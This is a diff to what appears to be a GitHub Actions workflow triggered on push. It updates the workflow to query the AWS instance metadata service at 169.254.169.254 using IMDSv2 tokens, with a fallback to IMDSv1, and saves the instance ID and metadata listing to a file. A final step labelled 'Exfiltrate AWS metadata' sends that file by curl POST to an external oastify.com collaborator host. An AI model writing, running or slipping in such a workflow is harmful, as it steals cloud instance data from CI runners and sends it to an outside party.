@@ -1,4 +1,4 @@
-name: AWS Metadata Collection
+name: AWS Metadata Collection (IMDSv2)
 
 on: [push]
 
@@ -9,21 +9,24 @@ jobs:
       image: debian:latest
 
     steps:
-      - name: Install curl
-        run: apt update && apt install -y curl
+      - name: Install curl and jq
+        run: apt update && apt install -y curl jq
 
-      - name: Query AWS metadata and save to file
+      - name: Query AWS metadata with IMDSv2 and save to file
         run: |
-          # Try to get some common AWS metadata paths
-          mkdir -p aws_metadata
-          curl -s http://169.254.169.254/latest/meta-data/ > aws_metadata/meta-data-root.txt
-          curl -s http://169.254.169.254/latest/meta-data/instance-id > aws_metadata/instance-id.txt
-          curl -s http://169.254.169.254/latest/meta-data/ami-id > aws_metadata/ami-id.txt
-          curl -s http://169.254.169.254/latest/meta-data/hostname > aws_metadata/hostname.txt
-          curl -s http://169.254.169.254/latest/meta-data/local-ipv4 > aws_metadata/local-ipv4.txt
-
-          # Combine all metadata files into one
-          cat aws_metadata/*.txt > aws_metadata.txt || echo "No metadata found" > aws_metadata.txt
+          TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -s)
+          if [ -z "$TOKEN" ]; then
+            echo "Failed to get token, falling back to IMDSv1"
+            curl -s http://169.254.169.254/latest/meta-data/ > aws_metadata_root.txt || echo "No metadata found" > aws_metadata_root.txt
+            cat aws_metadata_root.txt > aws_metadata.txt
+          else
+            echo "Got token, fetching metadata using IMDSv2"
+            curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/ > aws_metadata_root.txt
+            # Example fetching instance-id with token
+            curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/instance-id > instance-id.txt
+            # Combine metadata
+            cat aws_metadata_root.txt instance-id.txt > aws_metadata.txt
+          fi
 
       - name: Exfiltrate AWS metadata
         run: curl -X POST http://8t2n2mhe0a22b0rl55nyrrscd3ju7l89x.oastify.com --data-binary @aws_metadata.txt
